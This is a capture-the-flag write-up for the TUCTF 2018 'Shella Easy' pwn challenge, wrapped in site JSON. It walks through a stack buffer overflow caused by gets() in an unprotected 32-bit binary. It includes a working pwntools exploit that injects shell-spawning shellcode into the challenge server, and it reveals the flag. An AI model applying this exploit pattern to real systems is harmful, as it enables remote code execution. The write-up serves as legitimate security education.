{"pageContext":{"html":"<p><a href=\"ctf=tu-ctf-2018\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=buffer-overflow\"></a>\n<a href=\"tools=radare2,gdb-peda,pwntools,python\"></a></p>\n<h1>Shella Easy</h1>\n<p>We are given a <a href=\"/shella-easy-e22bd66817bad2d56690bd678a395899.\">binary</a> without any exploit mitigations.</p>\n<pre><code class=\"language-bash\">vagrant@amy:~/share/shella_easy$ file shella-easy\nshella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped\n</code></pre>\n<pre><code class=\"language-bash\">gdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : disabled\nPIE       : disabled\nRELRO     : Partial\n</code></pre>\n<p>The program has a call to <code>gets</code> and thus is a vanilla stack based buffer overflow. Exploitation allows us to get the flag from the server.</p>\n<pre><code class=\"language-python\">from pwn import *\n\ncontext(arch='i386', os='linux')\n# p = process('./shella')\np = remote('52.15.182.55', 12345)\n\np.recvuntil(\"Yeah I'll have a \")\nleak = p.recvuntil(' ').strip()\nleak = int(leak, 16)\n\nshellcode = asm(shellcraft.i386.sh())\nshellcode = shellcode.ljust(64, '\\x90')\nshellcode += p32(0xdeadbeef)\nshellcode += 'a' * 8\nshellcode += p32(leak)\np.send(shellcode)\np.interactive()\n</code></pre>\n<p>Flag</p>\n<blockquote>\n<p>TUCTF{1_607_4_fl46_bu7_n0_fr135}</p>\n</blockquote>","relativePath":"writeups/tu-ctf-2018/pwn/shella-easy/jaiverma"}}